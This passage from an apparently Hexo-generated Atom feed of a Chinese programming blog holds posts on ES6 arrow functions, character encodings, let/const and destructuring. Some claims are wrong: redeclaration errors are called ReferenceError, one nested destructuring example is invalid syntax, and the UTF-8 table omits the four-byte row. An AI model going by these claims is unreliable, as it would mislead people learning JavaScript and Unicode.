<p>这段代码中setTimeout中回调如果是匿名函数(普通函数)的话，那么其中的this是指向全局对象的，因为是函数调用模式(关于this的指向问题可以看我另外一篇博客)，但是使用了箭头函数，那么其中的this指向就是定义的函数所在的对象，也就是<code>handler</code>。还有一个问题需要注意的是，在箭头函数中，this其实是不存在，也就是我们利用apply, call , bind等修改函数内部this指向的方法是不管用的。还有<code>super</code>,<code>arguments</code>,<code>new.target</code>这三个变量在建有函数中也是不存在的。</p>
<ul>
<li>箭头函数不可以当做构造函数来使用，也就是说不能使用new命令</li>
</ul>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> Perosn = (name, age) =&gt; &#123;</div><div class="line">	<span class="keyword">this</span>.name = name;</div><div class="line">	<span class="keyword">this</span>.age = age;</div><div class="line">&#125;</div><div class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> Perosn(<span class="string">'summer'</span>, <span class="number">19</span>);  <span class="comment">//TypeError</span></div></pre></td></tr></table></figure>
<ul>
<li>不可以使用<code>yield</code>命令，所以箭头函数不能用做Generator函数</li>
</ul>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>箭头函数本质上就是lambda表达式，网上有许多人认为箭头函数就是ES6的又一个语法糖，而且降低了代码的可读性。在ES6标准发布的这么一段时间里，是是非非的争论总是无休止的。个人觉得语法糖这么一说不像那么回事，至于代码的可读性，那就是代码编写风格和水平的问题了。总而言之，言而总之，ES6的时代已经到来，其众多的新特性必将会改变现在前端开发的布局，好坏留给后人去说吧！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Arrow Function&lt;/strong&gt;让我想起了python的&lt;code&gt;lambda&lt;/code&gt;函数,其实很多语言都支持lambda函数，包括javascript,但是javascript的lambda函数就显得那么的无味。es6的Arrow Function的到来这改变了我们书写函数表达式的方式，也给javascript带来了真正的lambda函数式。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>学习字符集编码</title>
    <link href="http://summerGreenTea.github.io/2015/12/08/learn-unicode/"/>
    <id>http://summerGreenTea.github.io/2015/12/08/learn-unicode/</id>
    <published>2015-12-08T08:30:42.000Z</published>
    <updated>2016-03-02T02:58:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>曾近有段时间在学php的时候，总是会碰到往数据库中插入数据乱码问题。前几天JSP老师在课上演示往SQLServer中插入数据，结果也是乱码一大堆了，调试了很久才正常。”字符乱码问题会伴随你们的程序人生”，他说这是这节课最重要的知识点。所以，身为一名未来的程序员，必要的字符编码知识是我们所必须掌握的。<br><a id="more"></a><br>我们先来了解一下一些基本概念:<br><strong>字符集</strong>：是一个系统支持的所有抽象字符的集合。字符是各种文字和符号的总称，包括各国家文字、标点符号、图形符号、数字等。<br><strong>字符集编码</strong>：是一套法则，使用该法则能够对自然语言的字符的一个集合（如字母表或音节表），与其他东西的一个集合（如号码或电脉冲）进行配对。即在符号集合与数字系统之间建立对应关系，它是信息处理的一项基本技术。通常人们用符号集合（一般情况下就是文字）来表达信息。而以计算机为基础的信息处理系统则是利用元件（硬件）不同状态的组合来存储和处理信息的。元件不同状态的组合能代表数字系统的数字，因此字符编码就是将符号转换为计算机可以接受的数字系统的数，称为数字代码。<br>简单来说就是，在计算机内部，我们用0和1来表示数据，也就是二进制，我们把不同种类的语言和这种语言中的字符书写方式用某种规则转化成计算机能识别的二进制数据。</p>
<h2 id="ASIIC码"><a href="#ASIIC码" class="headerlink" title="ASIIC码"></a>ASIIC码</h2><p>早期的计算机由于是美国人发明的，所以设计之初呢，美国人将英文中的26个英文字母、控制字符（回车键、退格、换行键等和阿拉伯数字用一个字节(八位二进制)来表示,这样最多可以定义256个字符，这个就是ASSIC码。在ASSIC码中，一共规定了128个字符，这些字符只占用了一个字节长度的后七位。<br><img src="/2015/12/08/learn-unicode/ascii1.png" alt="[ASCII码表1]" title="[ASCII码表1]"><br><img src="/2015/12/08/learn-unicode/ascii1.png" alt="[ASCII码表2]" title="[ASCII码表2]"><br>但是随着计算机的发展和普及，越来越多的国家开始使用计算机，不同的国家有不同的字母和语言，而传统的ASSIC的八位二进制最多表示256个字符显然已经满足不了各个国家的字符编码需求了。那么 <em>Unicode</em> 出现了。</p>
<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>Unicode的制定方是ISO(国际标准制定组织)，它们的解决方法简单除暴—-把全世界的字母和符号都弄成一中编码方式表示，他们管这个叫Unicode标准。它定义Unicode字符集和Unicode的编码方式(后面会提到)。<br>Unicode规定字符的表示方式为 <em>U+</em> 加上一组十六进制数，这租十六进制数叫做<strong>码点</strong>，Unicode分十七个的平面，整体能表示的字符数量为2<sup>21</sup>。一个基本平面，表示的范围是<strong>U+0000~U+FFFF</strong>,另外十六个平面表示的范围是<strong>U+010000~U+10FFFF</strong>。<br>对于之前的ASSIC码表示的字符，则采用原先的ASSIC码来表示，只是在原先的ASSIC码的基础上在前面加8个0来组成两个字节(这种方式带来的问题是，对于前面127个字符，如果利用Unicode存储这会多浪费一个字节的空间)。其他的字符的编码也是对应排列下去，如果2个字节的长度还不能满足现有的字符，则用3个或4个字节来表示，等等。其实Unicode的字符表示方式给人的感觉是非常大气的，但是这种表示方式带来的问题也很多。<br>首先，就是前面提到的，对于原先的ASSIC码所对应的字符，在Unicode中表示的话则多浪费了一个字节的的存储空间。再一个就是全世界的字符非常多，那么就需要更长的字节来表示一个字符，那么对于原本只需要一个或两个字节表示的字符，我们现在给改为统一的3个或4个字节来表示，造成的结果解释前者的字符编码前面加了很多个0，这对于存储空间是个极大的浪费。Unicode的编码还无法来计算机知道，字符的编码长度，这样计算机也就不知道，这个编码是代表一个字符还是两个字符或者其他的。<br>所以早期的Unicode推广很不顺利，随着互联网的出现，这些问题都得到了解决，人们根据原来的Unicode的编码规则用不同的方式来进行实现，并一步一步的解决了这些问题。</p>
<h3 id="UTF-8编码"><a href="#UTF-8编码" class="headerlink" title="UTF-8编码"></a>UTF-8编码</h3><p>UTF-8是以字节为单位来对Unicode进行编码,它的编码方式可以总结为：</p>
<ol>
<li>对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。<br>2.<br>对于n字节的符号（n&gt;1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。<br>| Unicode编码(十六进制) | UTF-8 字节流(二进制)         |<br>| ————- |:————-:|<br>| 00000000 - 0000007F | 0xxxxxxx |<br>| 00000080 - 000007FF | 110xxxxx 10xxxxxx |<br>| 00000800 - 0000FFFF | 1110xxxx 10xxxxxx 10xxxxxx |<br>| 00200000 - 03FFFFFF | 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx |<br>| 04000000 - 7FFFFFFF | 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx |<br>UTF-8的特点是节省空间，它的前128个字符的编码和ASSIC码一样，都是用一个字节表示，它也就成为了当下计算机最流行的编码方式。</li>
</ol>
<h3 id="UTF-32编码"><a href="#UTF-32编码" class="headerlink" title="UTF-32编码"></a>UTF-32编码</h3><p>UTF-32又称为<strong>USC-4</strong>。<br>UTF-32的编码都使用4个字节来表示一个字符，这种编码方式是最浪费存储空间的，但是优点就是方便查找，在HTML5的标准中，已经明确网页不能使用UTF-32来进行编码。</p>
<h3 id="UTF-16编码"><a href="#UTF-16编码" class="headerlink" title="UTF-16编码"></a>UTF-16编码</h3><p>在Unicode中的字符非常多，但是我们大多数人使用最平凡的则是0~65535以内的字符，也就是基本平面(BMP)只需要2两个字节就可以完全表示。于是就有了UTF-16编码，这是一种在字符存储空间和字符查找效率上综合的编码方式。<br>由于在基本平面内(BMP),从U+D800~U+DFFF是没有对应字符的(具体原因还有待解答)，那么在辅助平面上(SMP)，总共有16个平面。每个平面有2<sup>16</sup>个字符编码，那么总共是2<sup>20</sup>个编码。UTF-16将这20位拆成两半，前10位映射在U+D800到U+DBFF，称为<strong>高位（H）</strong> ，后10位映射在U+DC00到U+DFFF，称为<strong>低位（L）</strong> 。这意味着，一个辅助平面的字符，被拆成两个基本平面的字符表示。那么我们在高位的范围中发现了一个字符编码，于是我们用UTF-16的<strong>对应规则</strong>去低位寻找另外一个字符编码，这样，我们就组成了一个在辅助平面上的字符编码。<br>上面提到的对应规则具体为：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">H = Math.floor((c<span class="number">-0x10000</span>) / <span class="number">0x400</span>)+<span class="number">0xD800</span></div><div class="line"></div><div class="line">L = (c - <span class="number">0x10000</span>) % <span class="number">0x400</span> + <span class="number">0xDC00</span></div></pre></td></tr></table></figure></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这篇文章是根据阮大神的<a href="http://www.ruanyifeng.com/blog/2014/12/unicode.html" target="_blank" rel="external">Unicode与JavaScript详解</a>和吴秦的<a href="http://www.cnblogs.com/skynet/archive/2011/05/03/2035105.html" target="_blank" rel="external">字符集和字符编码</a>的一些讲解加上自己的一些思考写出来的，但是这些毕竟不是官方文档的解释，所以肯定会有些错误，在日后的自己学习当中，会补充和修改。<br>总的来说，我在字符集相关方面的知识还是比较浅，还是需要在日后的一些实践中多多总结，它们的文中的有些点的讲解还是需要好好琢磨一下。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;曾近有段时间在学php的时候，总是会碰到往数据库中插入数据乱码问题。前几天JSP老师在课上演示往SQLServer中插入数据，结果也是乱码一大堆了，调试了很久才正常。”字符乱码问题会伴随你们的程序人生”，他说这是这节课最重要的知识点。所以，身为一名未来的程序员，必要的字符编码知识是我们所必须掌握的。&lt;br&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="http://summerGreenTea.github.io/tags/Javascript/"/>
    
      <category term="Unicode" scheme="http://summerGreenTea.github.io/tags/Unicode/"/>
    
  </entry>
  
  <entry>
    <title>ESMAScript6系列之let-const命令</title>
    <link href="http://summerGreenTea.github.io/2015/12/07/es6-let-const/"/>
    <id>http://summerGreenTea.github.io/2015/12/07/es6-let-const/</id>
    <published>2015-12-07T13:55:12.000Z</published>
    <updated>2016-07-31T13:19:17.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>ECMAScript6</code>在2015年6月份正式定稿，这也就预示着以ECMAScript为语言的核心的javascript进入了一个新的系列。这个系列的文章就记录了我学习的<code>ECMAScript6</code>的一些笔记和总结。</p>
<a id="more"></a>
<h2 id="let-const命令"><a href="#let-const命令" class="headerlink" title="let-const命令"></a>let-const命令</h2><h3 id="不存在变量作用域提升"><a href="#不存在变量作用域提升" class="headerlink" title="不存在变量作用域提升"></a>不存在变量作用域提升</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">## part 1</span></div><div class="line">console.log(a);   <span class="comment">//undefined  </span></div><div class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line"><span class="meta">## part 2</span></div><div class="line">console.log(a); <span class="comment">//ReferenceError</span></div><div class="line">let a = <span class="number">1</span>;</div><div class="line"><span class="meta">## part 3</span></div><div class="line">console.log(a);  <span class="comment">//ReferenceError</span></div><div class="line"><span class="keyword">const</span> a = <span class="number">1</span>;</div></pre></td></tr></table></figure>
<h3 id="暂时性死区"><a href="#暂时性死区" class="headerlink" title="暂时性死区"></a>暂时性死区</h3><p>在ECMAScript6中规定，一旦在代码区块中有变量的声明，那么在变量声明语句之前使用该变量就会报错。<br>对于在代码块中用<code>let</code>和<code>const</code>声明的变量来说，改代码块就相当形成了一个<code>封闭作用域</code>，凡是在声明命令之前使用这些变量，都是不合法的。这种情况在语法上叫做<strong>暂时性死区</strong>。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="literal">true</span>) &#123;</div><div class="line">    <span class="built_in">name</span> = <span class="string">"淡夏的绿茶"</span>;   <span class="comment">//ReferenceError</span></div><div class="line">    let <span class="built_in">name</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="不允许重复声明"><a href="#不允许重复声明" class="headerlink" title="不允许重复声明"></a>不允许重复声明</h3><p>这个是指我们在一个块级作用域内(注意：在ECMAScript6中，使用<code>let</code>和<code>const</code>声明的变量会在该代码块中形成块级作用域)用<code>let</code>、<code>const</code>和<code>var</code>声明变量的时候，不能重复使用<code>let</code>和<code>const</code>声明。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> name = <span class="string">"淡夏的绿茶"</span>;</div><div class="line"><span class="keyword">let</span> name = <span class="string">"淡夏的绿茶"</span>; <span class="comment">// ReferenceError</span></div></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printName</span> (<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">let</span> name = <span class="string">"淡夏的绿茶"</span>; <span class="comment">// ReferenceError</span></div><div class="line">    <span class="keyword">return</span> name;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h3><p>在前面我们也提到了ECMAScript6中块级作用域的一些概念。举几个例子吧：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// example 1</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">summer</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> name = <span class="string">"summer"</span>;</div><div class="line">    <span class="keyword">return</span> name;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</div><div class="line">    <span class="keyword">var</span> age = <span class="number">20</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">console</span>.log(name); <span class="comment">// ReferenceError</span></div><div class="line"><span class="built_in">console</span>.log(age);  <span class="comment">// 20</span></div></pre></td></tr></table></figure></p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// example 2</span></div><div class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</div><div class="line">    let <span class="built_in">name</span> = <span class="string">"summer"</span>;</div><div class="line">&#125;</div><div class="line">console.<span class="built_in">log</span>(<span class="built_in">name</span>); <span class="comment">// ReferenceError</span></div></pre></td></tr></table></figure>
<p>第一个例子是说在之前版本中，只存在全局作用域和函数作用域了，所以在出函数中定义的变量都会被绑定在window这个全局对象上，这个会污染全局的命名空间，特别在我们引入大量第三方库的时候。第二个例子是说，我们在if后面的代码块中用let声明了一个变量name，那么name只能在if后面的代码块中被访问。<br>在ECMAscript6中，给<code>let</code>和<code>const</code>声明的变量所在代码块形成一个块级作用域，这些变量只能在这个块级作用域中被访问。这个块级作用域只是针对let 和 const声明的变量，对var声明的变量，还是只支持全局作用域和函数作用域。</p>
<h3 id="const常量"><a href="#const常量" class="headerlink" title="const常量"></a>const常量</h3><p><code>const</code>用来声明常量，这个就表示const声明的变量是不能被修改的，而且const变量一旦生命就必须初始化。<br>当const变量指向一个对象的时候，这个变量保存的是这个对象的内存空间的地址(学过C的同学应该不陌生),所以我们只要保证改地址不变的基础上，可以改变这个对象的内容(属性和方法)。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="literal">PI</span> = <span class="number">3.14</span>;</div><div class="line"><span class="literal">PI</span> = <span class="number">3</span>;  <span class="comment">// TypeError</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> arr = [];</div><div class="line">arr.push(<span class="string">"summer"</span>);</div><div class="line">console.<span class="built_in">log</span>(arr);  <span class="comment">// ["summer"]</span></div></pre></td></tr></table></figure></p>
<h3 id="全局对象属性"><a href="#全局对象属性" class="headerlink" title="全局对象属性"></a>全局对象属性</h3><p>如果用<code>let</code>和<code>const</code>在全局作用域上声明变量，不会被添加到全局对象上。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// global.js</span></div><div class="line"></div><div class="line"><span class="keyword">let</span> name = <span class="string">"summer"</span>;</div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.name); <span class="comment">//undefined</span></div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;ECMAScript6&lt;/code&gt;在2015年6月份正式定稿，这也就预示着以ECMAScript为语言的核心的javascript进入了一个新的系列。这个系列的文章就记录了我学习的&lt;code&gt;ECMAScript6&lt;/code&gt;的一些笔记和总结。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="http://summerGreenTea.github.io/tags/Javascript/"/>
    
      <category term="ESMAScript6" scheme="http://summerGreenTea.github.io/tags/ESMAScript6/"/>
    
  </entry>
  
  <entry>
    <title>学习ECMAScript6系列之结构表达式</title>
    <link href="http://summerGreenTea.github.io/2015/12/07/es6-destructuring-assignment/"/>
    <id>http://summerGreenTea.github.io/2015/12/07/es6-destructuring-assignment/</id>
    <published>2015-12-07T13:54:42.000Z</published>
    <updated>2016-03-02T02:58:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ECMAScript6解构表达式</strong> 允许你使用类似数组或对象字面量的方式将数组和对象的属性赋值给变量。这种赋值语句非常简洁明了,我们可以用解构表达式来帮助我们书写更加“清晰”的代码。<br><a id="more"></a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>使用解构表达式是间非常简单的事情，我们只需要用类数组(解构类似数组，但其实是对应解构数组的一种解构)或类对象字面量的方式来将数组、对象字面量或迭代器(Iterator)的值赋值给解构解构中的变量，比如：<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> [name, age, gender] = [<span class="string">'summer'</span>, <span class="number">20</span>, <span class="string">'man'</span>];</div><div class="line"><span class="keyword">let</span> &#123;name, age, gender&#125; = &#123;name: <span class="string">'summer'</span>, age: <span class="number">20</span>, gender: <span class="string">'man'</span>&#125;;</div></pre></td></tr></table></figure></p>
<p>上面的代码就是使用解构表达式来对需要赋值的变量进行解构赋值。</p>
<h2 id="对数组的解构"><a href="#对数组的解构" class="headerlink" title="对数组的解构"></a>对数组的解构</h2><p>这种方式应用在嵌套较深的数组的时候显得非常游刃有余。<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">let [a, [b, [c, d]]] = [1, [2, [3, 4]]];</div><div class="line">// 相当于</div><div class="line">const arr = [1, [2, [3, 4]]];</div><div class="line">let a = arr[<span class="string">0</span>], b = arr[<span class="string">1</span>][<span class="symbol">0</span>], c = arr[<span class="string">1</span>][<span class="symbol">1</span>][<span class="string">0</span>], d = arr[<span class="string">1</span>][<span class="symbol">1</span>][<span class="string">1</span>];</div></pre></td></tr></table></figure></p>
<p>可以通过留空来对解构的值用变量赋值：<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">let [, , gender] = [<span class="string">'summer'</span>, <span class="number">20</span>, <span class="string">'man'</span>];</div></pre></td></tr></table></figure></p>
<p>还可以通过可变参数对进行赋值：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">let [a, ...b] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</div><div class="line">console.log(a, b);</div><div class="line"><span class="comment">// 1, [2,3,4,5]</span></div></pre></td></tr></table></figure></p>
<p>如果我们的解构结构(读起来都点绕口)的变量对应的值为空的话，那么这个变量的值为undefined，这个时候可以给变量指定一个默认的值:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">let [<span class="built_in">name</span>] = [];</div><div class="line">console.<span class="built_in">log</span>(<span class="built_in">name</span>); <span class="comment">//undefined</span></div><div class="line">let [<span class="built_in">name</span> = <span class="string">'summer'</span>] = [];</div><div class="line">console.<span class="built_in">log</span>(<span class="built_in">name</span>); <span class="comment">//'summer'</span></div></pre></td></tr></table></figure></p>
<p>当对除数组外，其他的数据类型进行解构，会报错：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> [foo] = <span class="number">1</span>;</div><div class="line"><span class="keyword">let</span> [foo] = <span class="literal">false</span>;</div><div class="line"><span class="keyword">let</span> [foo] = <span class="literal">NaN</span>;</div><div class="line"><span class="keyword">let</span> [foo] = <span class="literal">undefined</span>;</div><div class="line"><span class="keyword">let</span> [foo] = <span class="literal">null</span>;</div><div class="line"><span class="keyword">let</span> [foo] = &#123;&#125;;</div></pre></td></tr></table></figure></p>
<h3 id="对对象的解构"><a href="#对对象的解构" class="headerlink" title="对对象的解构"></a>对对象的解构</h3><p>通常，我们对对象的解构有两种写法：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">let &#123;name, age&#125; = &#123;<span class="string">name:</span> <span class="string">'summer'</span>, <span class="string">age:</span> <span class="number">20</span>&#125;;</div><div class="line">let &#123;<span class="string">name:</span> nameA, <span class="string">age:</span> ageA&#125; = &#123;<span class="string">name:</span> <span class="string">'summer'</span>, <span class="string">age:</span> <span class="number">20</span>&#125;;</div></pre></td></tr></table></figure></p>
<p>上面两种写法取决你是否需要将变量名变的和属性名一样。<br>对对象的解构在有些方面的写法和对数组的解构类似：<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// 对空对象的解构</div><div class="line"><span class="keyword">let</span> &#123;name&#125; = &#123;&#125;;</div><div class="line">console.log(name);</div><div class="line">// undefined</div><div class="line"></div><div class="line"><span class="keyword">let</span> &#123;name, &#123;address, [likes1, likes2]&#125;&#125; = &#123;name: <span class="string">'summer'</span>, details: &#123;address: <span class="string">'Jiangxi China'</span>, likes: [<span class="string">'play basketball'</span>, <span class="string">'listen music'</span>]&#125;&#125;;</div><div class="line">console.log(name, address, likes1, likes2);</div><div class="line">// <span class="string">'summer'</span>,<span class="string">'Jiangxi China'</span>,<span class="string">'play basketball'</span>,<span class="string">'listen music'</span></div></pre></td></tr></table></figure></p>
<p>当尝试解构null或undefined的时候，就会报错：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> &#123;name&#125; = <span class="literal">null</span>;</div><div class="line"><span class="comment">// TypeError: null has no properties</span></div></pre></td></tr></table></figure></p>
<p>当解构原始数据类型，将得到undefined.<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">let &#123;<span class="built_in">name</span>&#125; = <span class="string">'summer'</span>;</div><div class="line">console.<span class="built_in">log</span>(<span class="built_in">name</span>);</div><div class="line"><span class="comment">// undefined</span></div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;ECMAScript6解构表达式&lt;/strong&gt; 允许你使用类似数组或对象字面量的方式将数组和对象的属性赋值给变量。这种赋值语句非常简洁明了,我们可以用解构表达式来帮助我们书写更加“清晰”的代码。&lt;br&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="http://summerGreenTea.github.io/tags/Javascript/"/>
    
      <category term="ESMAScript6" scheme="http://summerGreenTea.github.io/tags/ESMAScript6/"/>
    
  </entry>
  
</feed>
